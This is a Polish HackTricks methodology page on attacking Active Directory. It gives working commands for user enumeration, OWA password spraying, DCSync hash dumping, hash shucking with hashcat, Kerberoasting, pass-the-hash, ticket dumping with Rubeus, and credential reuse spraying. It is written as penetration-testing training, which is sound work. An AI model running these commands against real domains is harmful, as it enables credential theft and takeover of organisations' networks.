# Metodologia Active Directory

{{#include ../../banners/hacktricks-training.md}}

## Podstawowy przegląd

**Active Directory** pełni rolę technologii podstawowej, umożliwiając **administratorom sieci** efektywne tworzenie i zarządzanie **domenami**, **użytkownikami** oraz **obiektami** w sieci. Został zaprojektowany z myślą o skalowalności, ułatwiając organizację dużej liczby użytkowników w zarządzalne **grupy** i **podgrupy**, jednocześnie kontrolując **prawa dostępu** na różnych poziomach.

Struktura **Active Directory** składa się z trzech głównych warstw: **domen**, **drzew** i **lasów**. **Domena** obejmuje zbiór obiektów, takich jak **użytkownicy** czy **urządzenia**, korzystających ze wspólnej bazy danych. **Drzewa** to grupy domen powiązane wspólną strukturą, a **las** reprezentuje kolekcję wielu drzew połączonych przez **relacje zaufania**, tworząc najwyższy poziom struktury organizacyjnej. Na każdym z tych poziomów można określić konkretne **uprawnienia** i **prawa komunikacji**.

Kluczowe pojęcia w **Active Directory** obejmują:

1. **Katalog (Directory)** – Zawiera wszystkie informacje dotyczące obiektów Active Directory.
2. **Obiekt (Object)** – Oznacza byty w katalogu, w tym **użytkowników**, **grupy** lub **udostępnione foldery**.
3. **Domena (Domain)** – Służy jako kontener dla obiektów katalogu; w **lasie** może istnieć wiele domen, z których każda utrzymuje własny zbiór obiektów.
4. **Drzewo (Tree)** – Grupa domen dzieląca wspólną domenę root.
5. **Las (Forest)** – Najwyższy poziom struktury organizacyjnej w Active Directory, składający się z kilku drzew powiązanych **relacjami zaufania**.

**Active Directory Domain Services (AD DS)** obejmuje zestaw usług krytycznych dla scentralizowanego zarządzania i komunikacji w sieci. Usługi te obejmują:

1. **Domain Services** – Centralizuje przechowywanie danych i zarządza interakcjami między **użytkownikami** a **domenami**, w tym funkcjami **uwierzytelniania** i **wyszukiwania**.
2. **Certificate Services** – Nadzoruje tworzenie, dystrybucję i zarządzanie bezpiecznymi **certyfikatami cyfrowymi**.
3. **Lightweight Directory Services** – Wspiera aplikacje korzystające z katalogu za pomocą protokołu **LDAP**.
4. **Directory Federation Services** – Zapewnia mechanizmy **single-sign-on** do uwierzytelniania użytkowników w wielu aplikacjach webowych w jednej sesji.
5. **Rights Management** – Pomaga chronić materiały objęte prawami autorskimi, regulując ich nieautoryzowane rozpowszechnianie i użycie.
6. **DNS Service** – Kluczowy dla rozwiązywania **nazw domenowych**.

For a more detailed explanation check: [**TechTerms - Active Directory Definition**](https://techterms.com/definition/active_directory)

### **Kerberos Authentication**

Aby nauczyć się, jak **atakować AD**, musisz bardzo dobrze zrozumieć proces uwierzytelniania **Kerberos**.\
[**Read this page if you still don't know how it works.**](kerberos-authentication.md)

## Skrócone podsumowanie

Możesz odwiedzić [https://wadcoms.github.io/](https://wadcoms.github.io) aby szybko zobaczyć, jakie polecenia możesz uruchomić, aby enumerate/exploit AD.

> [!WARNING]
> Komunikacja Kerberos wymaga pełnej qualifid name (FQDN) do wykonywania akcji. Jeśli spróbujesz uzyskać dostęp do maszyny przez adres IP, **zostanie użyty NTLM, a nie kerberos**.

## Rekonesans Active Directory (Brak poświadczeń/sesji)

Jeśli masz dostęp do środowiska AD, ale nie posiadasz żadnych poświadczeń/sesji, możesz:

- **Pentest the network:**
- Skanuj sieć, znajdź maszyny i otwarte porty oraz spróbuj **wykspiować luki** lub **wyekstrahować poświadczenia** z tych maszyn (na przykład, [printers could be very interesting targets](ad-information-in-printers.md)).
- Enumeracja DNS może dostarczyć informacji o kluczowych serwerach w domenie, takich jak web, drukarki, udziały, vpn, media itp.
- `gobuster dns -d domain.local -t 25 -w /opt/Seclist/Discovery/DNS/subdomain-top2000.txt`
- Rzuć okiem na ogólną [**Pentesting Methodology**](../../generic-methodologies-and-resources/pentesting-methodology.md) aby znaleźć więcej informacji, jak to robić.
- **Sprawdź dostęp null i Guest na usługach smb** (to nie zadziała na nowoczesnych wersjach Windows):
- `enum4linux -a -u "" -p "" <DC IP> && enum4linux -a -u "guest" -p "" <DC IP>`
- `smbmap -u "" -p "" -P 445 -H <DC IP> && smbmap -u "guest" -p "" -P 445 -H <DC IP>`
- `smbclient -U '%' -L //<DC IP> && smbclient -U 'guest%' -L //`
- Bardziej szczegółowy przewodnik po enumeracji serwera SMB znajdziesz tutaj:


{{#ref}}
../../network-services-pentesting/pentesting-smb/
{{#endref}}

- **Enumerate Ldap**
- `nmap -n -sV --script "ldap* and not brute" -p 389 <DC IP>`
- Bardziej szczegółowy przewodnik po enumeracji LDAP znajdziesz tutaj (zwróć **szczególną uwagę na anonimowy dostęp**):


{{#ref}}
../../network-services-pentesting/pentesting-ldap.md
{{#endref}}

- **Poison the network**
- Zbieraj poświadczenia, **podszywając się pod usługi przy użyciu Responder** (../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md)
- Uzyskaj dostęp do hosta przez [**abusing the relay attack**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack)
- Zbieraj poświadczenia, **eksponując fałszywe usługi UPnP z evil-S** (../../generic-methodologies-and-resources/pentesting-network/spoofing-ssdp-and-upnp-devices.md)[**SDP**](https://medium.com/@nickvangilder/exploiting-multifunction-printers-during-a-penetration-test-engagement-28d3840d8856)
- [**OSINT**](https://book.hacktricks.wiki/en/generic-methodologies-and-resources/external-recon-methodology/index.html):
- Wyodrębnij nazwy użytkowników/imiona z dokumentów wewnętrznych, mediów społecznościowych, usług (głównie web) w środowiskach domenowych oraz z zasobów publicznie dostępnych.
- Jeśli znajdziesz pełne imiona i nazwiska pracowników firmy, możesz spróbować różnych konwencji tworzenia nazw użytkowników w AD ([**read this**](https://activedirectorypro.com/active-directory-user-naming-convention/)). Najczęstsze konwencje to: _NameSurname_, _Name.Surname_, _NamSur_ (3 litery z każdego), _Nam.Sur_, _NSurname_, _N.Surname_, _SurnameName_, _Surname.Name_, _SurnameN_, _Surname.N_, 3 _losowe litery i 3 losowe cyfry_ (abc123).
- Narzędzia:
- [w0Tx/generate-ad-username](https://github.com/w0Tx/generate-ad-username)
- [urbanadventurer/username-anarchy](https://github.com/urbanadventurer/username-anarchy)

### Enumeracja użytkowników

- **Anonymous SMB/LDAP enum:** Sprawdź strony [**pentesting SMB**](../../network-services-pentesting/pentesting-smb/index.html) oraz [**pentesting LDAP**](../../network-services-pentesting/pentesting-ldap.md).
- **Kerbrute enum**: Gdy żądany jest nieprawidłowy username, serwer odpowie kodem błędu Kerberos _KRB5KDC_ERR_C_PRINCIPAL_UNKNOWN_, co pozwala nam stwierdzić, że nazwa użytkownika jest nieprawidłowa. **Prawidłowe nazwy użytkowników** spowodują albo przesłanie TGT w odpowiedzi AS-REP, albo błąd _KRB5KDC_ERR_PREAUTH_REQUIRED_, wskazujący, że użytkownik musi wykonać pre-autoryzację.
- **No Authentication against MS-NRPC:** Używając auth-level = 1 (No authentication) przeciwko interfejsowi MS-NRPC (Netlogon) na kontrolerach domen. Metoda wywołuje funkcję `DsrGetDcNameEx2` po związywaniu interfejsu MS-NRPC, aby sprawdzić, czy użytkownik lub komputer istnieje bez jakichkolwiek poświadczeń. Narzędzie [NauthNRPC](https://github.com/sud0Ru/NauthNRPC) implementuje tego typu enumerację. Badanie można znaleźć [tutaj](https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2024/05/22190247/A-journey-into-forgotten-Null-Session-and-MS-RPC-interfaces.pdf)
```bash
./kerbrute_linux_amd64 userenum -d lab.ropnop.com --dc 10.10.10.10 usernames.txt #From https://github.com/ropnop/kerbrute/releases

nmap -p 88 --script=krb5-enum-users --script-args="krb5-enum-users.realm='DOMAIN'" <IP>
Nmap -p 88 --script=krb5-enum-users --script-args krb5-enum-users.realm='<domain>',userdb=/root/Desktop/usernames.txt <IP>

msf> use auxiliary/gather/kerberos_enumusers

crackmapexec smb dominio.es  -u '' -p '' --users | awk '{print $4}' | uniq
python3 nauth.py -t target -u users_file.txt #From https://github.com/sud0Ru/NauthNRPC
```
- **OWA (Outlook Web Access) Server**

Jeżeli znajdziesz taki serwer w sieci, możesz również przeprowadzić na nim **enumerację użytkowników**. Na przykład możesz użyć narzędzia [**MailSniper**](https://github.com/dafthack/MailSniper):
```bash
ipmo C:\Tools\MailSniper\MailSniper.ps1
# Get info about the domain
Invoke-DomainHarvestOWA -ExchHostname [ip]
# Enumerate valid users from a list of potential usernames
Invoke-UsernameHarvestOWA -ExchHostname [ip] -Domain [domain] -UserList .\possible-usernames.txt -OutFile valid.txt
# Password spraying
Invoke-PasswordSprayOWA -ExchHostname [ip] -UserList .\valid.txt -Password Summer2021
# Get addresses list from the compromised mail
Get-GlobalAddressList -ExchHostname [ip] -UserName [domain]\[username] -Password Summer2021 -OutFile gal.txt
```
> [!WARNING]
> Możesz znaleźć listy nazw użytkowników w [**this github repo**](https://github.com/danielmiessler/SecLists/tree/master/Usernames/Names)  and this one ([**statistically-likely-usernames**](https://github.com/insidetrust/statistically-likely-usernames)).
>
> Jednak powinieneś mieć **imiona i nazwiska osób pracujących w firmie** z kroku recon, który powinieneś wykonać wcześniej. Mając imię i nazwisko możesz użyć skryptu [**namemash.py**](https://gist.github.com/superkojiman/11076951) aby wygenerować potencjalne poprawne usernames.

### Znając jedną lub kilka usernames

Ok, więc wiesz, że masz już ważny username, ale brak haseł... Spróbuj wtedy:

- [**ASREPRoast**](asreproast.md): Jeśli użytkownik **nie ma** atrybutu _DONT_REQ_PREAUTH_ możesz **zażądać wiadomości AS_REP** dla tego użytkownika, która będzie zawierać dane zaszyfrowane pochodną hasła tego użytkownika.
- [**Password Spraying**](password-spraying.md): Spróbuj najczęstszych **passwords** dla każdego z wykrytych użytkowników — być może któryś używa słabego passworda (pamiętaj o password policy!).
- Zauważ, że możesz też **spray OWA servers**, aby spróbować uzyskać dostęp do mail servers użytkowników.


{{#ref}}
password-spraying.md
{{#endref}}

### LLMNR/NBT-NS Poisoning

Możesz być w stanie uzyskać pewne challenge **hashes**, które można złamać, poprzez **poisoning** niektórych protokołów w sieci:


{{#ref}}
../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md
{{#endref}}

### NTLM Relay

Jeśli udało Ci się zenumerować Active Directory, będziesz mieć **więcej adresów email i lepsze zrozumienie sieci**. Możesz być w stanie wymusić NTLM [**relay attacks**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack) aby uzyskać dostęp do AD env.

### NetExec workspace-driven recon & relay posture checks

- Użyj **`nxcdb` workspaces** aby zachować stan AD recon dla danego engagementu: `workspace create <name>` tworzy per-protocol SQLite DBs w `~/.nxc/workspaces/<name>` (smb/mssql/winrm/ldap/etc). Przełączaj widoki poleceniem `proto smb|mssql|winrm` i listuj zebrane sekrety przez `creds`. Ręcznie usuń wrażliwe dane po zakończeniu: `rm -rf ~/.nxc/workspaces/<name>`.
- Szybkie wykrywanie podsieci za pomocą **`netexec smb <cidr>`** ujawnia **domain**, **OS build**, **SMB signing requirements**, oraz **Null Auth**. Podmioty pokazujące `(signing:False)` są **relay-prone**, podczas gdy DCs często wymagają signing.
- Generuj **hostnames in /etc/hosts** bezpośrednio z wyjścia NetExec, aby ułatwić targeting:
```bash
netexec smb 10.2.10.0/24 --generate-hosts-file hosts
cat hosts /etc/hosts | sponge /etc/hosts
```
- Gdy **SMB relay to the DC is blocked** przez signing, nadal sprawdzaj konfigurację **LDAP**: `netexec ldap <dc>` pokazuje `(signing:None)` / słabe channel binding. DC z SMB signing required, ale LDAP signing disabled, pozostaje realnym celem **relay-to-LDAP** do nadużyć takich jak **SPN-less RBCD**.

### Po stronie klienta printer credential leaks → masowa walidacja poświadczeń domeny

- Interfejsy Printer/web UIs czasami **embed masked admin passwords in HTML**. Przeglądanie source/devtools może ujawnić cleartext (np. `<input value="<password>">`), umożliwiając dostęp przez Basic-auth do repozytoriów skanów/drukowania.
- Pobrane print jobs mogą zawierać **plaintext onboarding docs** z per-user passwords. Zachowaj zgodność par podczas testowania:
```bash
cat IT_Procedures.txt | grep Username: | cut -d' ' -f2 > usernames
cat IT_Procedures.txt | grep Password: | cut -d' ' -f3 > passwords
netexec smb <dc> -u usernames -p passwords --no-bruteforce --continue-on-success
```
### Steal NTLM Creds

Jeśli możesz **dostępować się do innych PC lub share'ów** za pomocą **null lub guest user**, możesz **umieścić pliki** (np. SCF), które po otwarciu **wywołają autentykację NTLM przeciwko Tobie**, dzięki czemu możesz **wykraść** **NTLM challenge** do złamania:


{{#ref}}
../ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### Hash Shucking & NT-Candidate Attacks

**Hash shucking** traktuje każdy NT hash, który już posiadasz, jako kandydat na hasło dla innych, wolniejszych formatów, których materiał klucza jest pochodną bezpośrednio z NT hasha. Zamiast brute-forcować długie frazy w ticketach Kerberos RC4, NetNTLM challenge'ach lub cached credentials, podajesz NT hashe do trybów NT-candidate w Hashcat i pozwalasz mu zweryfikować ponowne użycie hasła bez poznania plaintextu. Jest to szczególnie skuteczne po kompromitacji domeny, gdy możesz zebrać tysiące aktualnych i historycznych NT hashy.

Użyj shuckingu gdy:

- Masz NT korpus z DCSync, dumpów SAM/SECURITY lub credential vaults i musisz sprawdzić ponowne użycie w innych domenach/lasach.
- Przechwycisz materiał Kerberos oparty na RC4 (`$krb5tgs$23$`, `$krb5asrep$23$`), odpowiedzi NetNTLM lub blob'y DCC/DCC2.
- Chcesz szybko udowodnić reuse dla długich, niełamalnych passphrase'ów i natychmiast pivotować przez Pass-the-Hash.

Technika **nie działa** przeciwko typom szyfrowania, których klucze nie są NT hashem (np. Kerberos etype 17/18 AES). Jeśli domena wymusza tylko AES, musisz wrócić do zwykłych trybów hasła.

#### Building an NT hash corpus

- **DCSync/NTDS** – Użyj `secretsdump.py` z history, aby pobrać jak największy zbiór NT hashy (i ich poprzednie wartości):

```bash
secretsdump.py <domain>/<user>@<dc_ip> -just-dc-ntlm -history -user-status -outputfile smoke_dump
grep -i ':::' smoke_dump.ntds | awk -F: '{print $4}' | sort -u > nt_candidates.txt
```

Wpisy history dramatically poszerzają pulę kandydatów, ponieważ Microsoft może przechowywać do 24 poprzednich hashy na konto. Po więcej metod zbierania sekretów NTDS zobacz:

{{#ref}}
dcsync.md
{{#endref}}

- **Endpoint cache dumps** – `nxc smb <ip> -u <local_admin> -p <password> --local-auth --lsa` (lub Mimikatz `lsadump::sam /patch`) ekstraktuje lokalne SAM/SECURITY i cached domain logons (DCC/DCC2). Deduplicate i dopisz te hashe do tego samego pliku `nt_candidates.txt`.
- **Track metadata** – Zachowuj username/domain, które wygenerowały każdy hash (nawet jeśli wordlist zawiera tylko hex). Pasujące hashe od razu mówią, który principal ponownie używa hasła, gdy Hashcat wypisze winning candidate.
- Preferuj kandydatów z tego samego lasu lub z zaufanego lasu; to maksymalizuje szansę overlapu przy shuckingu.

#### Hashcat NT-candidate modes

| Hash Type                                | Password Mode | NT-Candidate Mode |
| ---------------------------------------- | ------------- | ----------------- |
| Domain Cached Credentials (DCC)          | 1100          | 31500             |
| Domain Cached Credentials 2 (DCC2)       | 2100          | 31600             |
| NetNTLMv1 / NetNTLMv1+ESS                | 5500          | 27000             |
| NetNTLMv2                                | 5600          | 27100             |
| Kerberos 5 etype 23 AS-REQ Pre-Auth      | 7500          | _N/A_             |
| Kerberos 5 etype 23 TGS-REP (Kerberoast) | 13100         | 35300             |
| Kerberos 5 etype 23 AS-REP               | 18200         | 35400             |

Uwagi:

- NT-candidate inputs **muszą pozostać surowymi 32-hex NT hashami**. Wyłącz silniki reguł (no `-r`, no hybrid modes), ponieważ mangling uszkadza materiał klucza kandydata.
- Te tryby nie są z natury szybsze, ale keyspace NTLM (~30,000 MH/s na M3 Max) jest ~100× szybszy niż Kerberos RC4 (~300 MH/s). Testowanie wyselekcjonowanej listy NT jest znacznie tańsze niż eksploracja całej przestrzeni haseł w wolnym formacie.
- Zawsze uruchamiaj **najnowszy build Hashcat** (`git clone https://github.com/hashcat/hashcat && make install`) ponieważ tryby 31500/31600/35300/35400 zostały dodane niedawno.
- Obecnie nie ma trybu NT dla AS-REQ Pre-Auth, a AES etypes (19600/19700) wymagają plaintextu, ponieważ ich klucze są pochodną PBKDF2 z UTF-16LE haseł, nie z surowych NT hashy.

#### Example – Kerberoast RC4 (mode 35300)

1. Przechwyć RC4 TGS dla docelowego SPN przy użyciu niskoprzywilejowanego usera (zobacz stronę Kerberoast po szczegóły):

{{#ref}}
kerberoast.md
{{#endref}}

```bash
GetUserSPNs.py -dc-ip <dc_ip> -request <domain>/<user> -outputfile roastable_TGS
```

2. Shuckuj ticket używając swojej listy NT:

```bash
hashcat -m 35300 roastable_TGS nt_candidates.txt
```

Hashcat wyprowadza klucz RC4 z każdego NT kandydata i weryfikuje `$krb5tgs$23$...` blob. Match potwierdza, że konto serwisowe używa jednego z twoich istniejących NT hashy.

3. Natychmiast pivotuj przez PtH:

```bash
nxc smb <dc_ip> -u roastable -H <matched_nt_hash>
```

Opcjonalnie możesz później odzyskać plaintext używając `hashcat -m 1000 <matched_hash> wordlists/` jeśli zajdzie potrzeba.

#### Example – Cached credentials (mode 31600)

1. Zrzutuj cached logons z kompromitowanej stacji roboczej:

```bash
nxc smb <host_ip> -u localadmin -p '<password>' --local-auth --lsa > lsa_dump.txt
```

2. Skopiuj linię DCC2 dla interesującego użytkownika domeny do `dcc2_highpriv.txt` i shuckuj ją:

```bash
hashcat -m 31600 dcc2_highpriv.txt nt_candidates.txt
```

3. Udany match daje NT hash już znany z twojej listy, potwierdzając, że cached user ponownie używa hasła. Użyj go bezpośrednio do PtH (`nxc smb <dc_ip> -u highpriv -H <hash>`) lub złam go offline w szybkim NTLM trybie, aby odzyskać string.

Dokładnie ten sam workflow dotyczy NetNTLM challenge-responses (`-m 27000/27100`) i DCC (`-m 31500`). Po wykryciu matcha możesz uruchomić relay, SMB/WMI/WinRM PtH, lub ponownie złamać NT hash z maskami/regułami offline.

## Enumerating Active Directory WITH credentials/session

Do tej fazy musisz mieć **skompromitowane credentials lub sesję prawidłowego konta domenowego.** Jeśli masz jakieś ważne credentials lub shell jako domain user, **pamiętaj, że wcześniej wymienione opcje wciąż są sposobami na kompromitację innych użytkowników.**

Zanim rozpoczniesz authenticated enumeration powinieneś znać problem **Kerberos double hop.**


{{#ref}}
kerberos-double-hop-problem.md
{{#endref}}

### Enumeration

Posiadanie skompromitowanego konta to **duży krok w kierunku kompromitacji całej domeny**, ponieważ będziesz w stanie rozpocząć **Active Directory Enumeration:**

Odnośnie [**ASREPRoast**](asreproast.md) możesz teraz znaleźć każdy możliwy podatny user, a odnośnie [**Password Spraying**](password-spraying.md) możesz uzyskać **listę wszystkich nazw użytkowników** i wypróbować hasło ze skompromitowanego konta, puste hasła oraz nowe obiecujące hasła.

- Możesz użyć [**CMD to perform a basic recon**](../basic-cmd-for-pentesters.md#domain-info)
- Możesz też użyć [**powershell for recon**](../basic-powershell-for-pentesters/index.html), co będzie bardziej stealthy
- Możesz także [**use powerview**](../basic-powershell-for-pentesters/powerview.md) aby wyciągnąć bardziej szczegółowe informacje
- Kolejne świetne narzędzie do recon w Active Directory to [**BloodHound**](bloodhound.md). Nie jest ono **zbyt stealthy** (w zależności od metod kolekcji), ale **jeśli Ci to nie przeszkadza**, zdecydowanie warto spróbować. Znajdź gdzie użytkownicy mogą RDP, ścieżki do innych grup, itp.
- **Inne zautomatyzowane narzędzia AD do enumeracji to:** [**AD Explorer**](bloodhound.md#ad-explorer)**,** [**ADRecon**](bloodhound.md#adrecon)**,** [**Group3r**](bloodhound.md#group3r)**,** [**PingCastle**](bloodhound.md#pingcastle)**.**
- [**DNS records of the AD**](ad-dns-records.md) ponieważ mogą zawierać interesujące informacje.
- Narzędzie z GUI, którego możesz użyć do enumeracji katalogu to **AdExplorer.exe** z pakietu **SysInternal**.
- Możesz też wyszukiwać w LDAP za pomocą **ldapsearch** aby szukać credentials w polach _userPassword_ & _unixUserPassword_, lub nawet w _Description_. por. [Password in AD User comment on PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md#password-in-ad-user-comment) dla innych metod.
- Jeśli używasz **Linux**, możesz też enumerować domenę używając [**pywerview**](https://github.com/the-useless-one/pywerview).
- Możesz też spróbować zautomatyzowane narzędzia takie jak:
- [**tomcarver16/ADSearch**](https://github.com/tomcarver16/ADSearch)
- [**61106960/adPEAS**](https://github.com/61106960/adPEAS)
- **Extracting all domain users**

Bardzo łatwo jest uzyskać wszystkie nazwy użytkowników domeny z Windows (`net user /domain` ,`Get-DomainUser` lub `wmic useraccount get name,sid`). W Linux możesz użyć: `GetADUsers.py -all -dc-ip 10.10.10.110 domain.com/username` lub `enum4linux -a -u "user" -p "password" <DC IP>`

> Nawet jeśli ta sekcja Enumeration wygląda krótko, to jest to najważniejsza część całości. Otwórz linki (głównie te do cmd, powershell, powerview i BloodHound), naucz się jak enumerować domenę i ćwicz aż poczujesz się komfortowo. Podczas assessmentu będzie to kluczowy moment, by znaleźć drogę do DA lub zdecydować, że nic więcej nie da się zrobić.

### Kerberoast

Kerberoasting polega na pozyskaniu **TGS ticketów** używanych przez serwisy powiązane z kontami użytkowników i łamaniu ich szyfrowania — które bazuje na hasłach użytkowników — **offline**.

Więcej na ten temat w:


{{#ref}}
kerberoast.md
{{#endref}}

### Remote connexion (RDP, SSH, FTP, Win-RM, etc)

Gdy zdobędziesz jakieś credentials możesz sprawdzić, czy masz dostęp do jakiejkolwiek **maszyny**. W tym celu możesz użyć **CrackMapExec** do próbowania łączenia na wielu serwerach przy użyciu różnych protokołów, zgodnie z wynikami port scanu.

### Local Privilege Escalation

Jeśli masz skompromitowane credentials lub sesję jako zwykły domain user i masz **dostęp** tym userem do **jakiejkolwiek maszyny w domenie**, powinieneś spróbować znaleźć sposób na **lokalne eskalowanie uprawnień i zbieranie credentials**. Tylko jako lokalny administrator będziesz w stanie **zrzucać hashe innych użytkowników** z pamięci (LSASS) i lokalnie (SAM).

W tej książce jest osobna strona o [**local privilege escalation in Windows**](../windows-local-privilege-escalation/index.html) oraz [**checklist**](../checklist-windows-privilege-escalation.md). Nie zapomnij też użyć [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite).

### Current Session Tickets

Jest bardzo **mało prawdopodobne**, że znajdziesz **tickety** w bieżącym userze, które dadzą Ci uprawnienia do dostępu do nieoczekiwanych zasobów, ale możesz to sprawdzić:
```bash
## List all tickets (if not admin, only current user tickets)
.\Rubeus.exe triage
## Dump the interesting one by luid
.\Rubeus.exe dump /service:krbtgt /luid:<luid> /nowrap
[IO.File]::WriteAllBytes("ticket.kirbi", [Convert]::FromBase64String("<BASE64_TICKET>"))
```
### NTLM Relay

Jeśli udało ci się zenumerować Active Directory, będziesz miał **więcej adresów e-mail i lepsze zrozumienie sieci**. Może udać się wymusić NTLM [**relay attacks**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack)**.**

### Looks for Creds in Computer Shares | SMB Shares

Teraz, gdy masz podstawowe poświadczenia, sprawdź, czy możesz **znaleźć** jakieś **interesujące pliki udostępnione w AD**. Możesz to robić ręcznie, ale to bardzo nudne, powtarzalne zadanie (szczególnie jeśli znajdziesz setki dokumentów do sprawdzenia).

[**Przejdź pod ten link, aby poznać narzędzia, które możesz wykorzystać.**](../../network-services-pentesting/pentesting-smb/index.html#domain-shared-folders-search)

### Steal NTLM Creds

Jeśli możesz **uzyskać dostęp do innych PC lub udziałów**, możesz **umieścić pliki** (np. plik SCF), które po otwarciu spowodują **wywołanie uwierzytelnienia NTLM wobec Ciebie**, dzięki czemu możesz **ukraść** **NTLM challenge** i go złamać:


{{#ref}}
../ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### CVE-2021-1675/CVE-2021-34527 PrintNightmare

Ta podatność pozwalała każdemu uwierzytelnionemu użytkownikowi na **przejęcie kontrolera domeny**.


{{#ref}}
printnightmare.md
{{#endref}}

## Privilege escalation on Active Directory WITH privileged credentials/session

**Dla poniższych technik zwykły użytkownik domeny nie wystarczy — potrzebujesz specjalnych uprawnień/poświadczeń, aby przeprowadzić te ataki.**

### Hash extraction

Miejmy nadzieję, że udało ci się **przejąć konto local admin** przy użyciu [AsRepRoast](asreproast.md), [Password Spraying](password-spraying.md), [Kerberoast](kerberoast.md), [Responder](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md) w tym relaying, [EvilSSDP](../../generic-methodologies-and-resources/pentesting-network/spoofing-ssdp-and-upnp-devices.md), [escalating privileges locally](../windows-local-privilege-escalation/index.html).\
Następnie czas zrzucić wszystkie hashe z pamięci i lokalnie.\
[**Przeczytaj tę stronę o różnych sposobach pozyskania hashy.**](https://github.com/carlospolop/hacktricks/blob/master/windows-hardening/active-directory-methodology/broken-reference/README.md)

### Pass the Hash

**Gdy masz hash użytkownika**, możesz go użyć do **podszycia się** pod niego.\
Musisz użyć jakiegoś **narzędzia**, które wykona **uwierzytelnienie NTLM używając** tego **hasha**, **lub** możesz utworzyć nowy **sessionlogon** i **wstrzyknąć** ten **hash** do **LSASS**, tak aby przy każdym wykonanym **uwierzytelnieniu NTLM** ten **hash** był używany. Opcję tę realizuje mimikatz.\
[**Przeczytaj tę stronę po więcej informacji.**](../ntlm/index.html#pass-the-hash)

### Over Pass the Hash/Pass the Key

Ten atak ma na celu **użycie hasha NTLM użytkownika do żądania ticketów Kerberos**, jako alternatywę do powszechnego Pass The Hash nad protokołem NTLM. W związku z tym może być szczególnie **użyteczny w sieciach, w których protokół NTLM jest wyłączony** i dozwolone jest wyłącznie **uwierzytelnianie Kerberos**.


{{#ref}}
over-pass-the-hash-pass-the-key.md
{{#endref}}

### Pass the Ticket

W metodzie ataku **Pass The Ticket (PTT)** atakujący **kradną ticket uwierzytelniający użytkownika** zamiast jego hasła lub wartości hash. Ukradziony ticket jest następnie używany do **podszywania się pod użytkownika**, uzyskując nieautoryzowany dostęp do zasobów i usług w sieci.


{{#ref}}
pass-the-ticket.md
{{#endref}}

### Credentials Reuse

Jeśli masz **hash** lub **hasło** **local administratora**, powinieneś spróbować **zalogować się lokalnie** na innych **PC** przy jego użyciu.
```bash
# Local Auth Spray (once you found some local admin pass or hash)
## --local-auth flag indicate to only try 1 time per machine
crackmapexec smb --local-auth 10.10.10.10/23 -u administrator -H 10298e182387f9cab376ecd08491764a0 | grep +
```
> [!WARNING]
> Zwróć uwagę, że to jest dość **hałaśliwe** i **LAPS** to **zmiękczy**.

### MSSQL Abuse & Trusted Links

Jeśli użytkownik ma uprawnienia do **dostępu do instancji MSSQL**, może użyć ich do **wykonywania poleceń** na hoście MSSQL (jeśli działa jako SA), **wykradać** NetNTLM **hash** lub nawet przeprowadzić **relay attack**.\
Również, jeśli instancja MSSQL jest zaufana (database link) przez inną instancję MSSQL — jeśli użytkownik ma uprawnienia do zaufanej bazy danych, będzie mógł **użyć relacji zaufania do wykonywania zapytań także w drugiej instancji**. Te zaufania mogą być łańcuchowane i w pewnym momencie użytkownik może znaleźć źle skonfigurowaną bazę danych, gdzie będzie w stanie wykonać polecenia.\
**Połączenia między bazami działają nawet w ramach forest trusts.**


{{#ref}}
abusing-ad-mssql.md
{{#endref}}

### IT asset/deployment platforms abuse

Zewnętrzne pakiety do inwentaryzacji i wdrożeń często ujawniają potężne ścieżki do poświadczeń i wykonywania kodu. Zobacz:

{{#ref}}
sccm-management-point-relay-sql-policy-secrets.md
{{#endref}}

{{#ref}}
lansweeper-security.md
{{#endref}}

### Unconstrained Delegation

Jeśli znajdziesz dowolny obiekt Computer z atrybutem [ADS_UF_TRUSTED_FOR_DELEGATION](<https://msdn.microsoft.com/en-us/library/aa772300(v=vs.85).aspx>) i masz uprawnienia domenowe na tym komputerze, będziesz w stanie zrzucać TGT z pamięci wszystkich użytkowników, którzy zalogują się na tym komputerze.\
Tak więc, jeśli **Domain Admin zaloguje się na tym komputerze**, będziesz w stanie zrzucić jego TGT i podszyć się pod niego używając [Pass the Ticket](pass-the-ticket.md).\
Dzięki constrained delegation możesz nawet **automatycznie przejąć Print Server** (oby to był DC).


{{#ref}}
unconstrained-delegation.md
{{#endref}}

### Constrained Delegation

Jeśli użytkownik lub komputer ma przyznane uprawnienia do "Constrained Delegation", będzie mógł **podszywać się pod dowolnego użytkownika, aby uzyskać dostęp do niektórych usług na komputerze**.\
Następnie, jeśli **skomprujesz hash** tego użytkownika/komputera, będziesz w stanie **podszyć się pod dowolnego użytkownika** (nawet domain adminów) w celu dostępu do wybranych usług.


{{#ref}}
constrained-delegation.md
{{#endref}}

### Resourced-based Constrain Delegation

Posiadanie uprawnienia **WRITE** na obiekcie Active Directory zdalnego komputera umożliwia uzyskanie wykonania kodu z **podwyższonymi uprawnieniami**:


{{#ref}}
resource-based-constrained-delegation.md
{{#endref}}

### Permissions/ACLs Abuse

Skompromitowany użytkownik może mieć pewne **interesujące uprawnienia do niektórych obiektów domenowych**, które pozwolą na późniejsze **lateral movement**/**eskalację** uprawnień.


{{#ref}}
acl-persistence-abuse/
{{#endref}}

### Printer Spooler service abuse

Odkrycie **usługi Spool nasłuchującej** w domenie może być **nadużyte** w celu **pozyskania nowych poświadczeń** i **eskalacji uprawnień**.


{{#ref}}
printers-spooler-service-abuse.md
{{#endref}}

### Third party sessions abuse

Jeśli **inni użytkownicy** **dostępają** do **skompromitowanej** maszyny, możliwe jest **zbieranie poświadczeń z pamięci** a nawet **wstrzykiwanie beaconów do ich procesów** w celu podszycia się pod nich.\
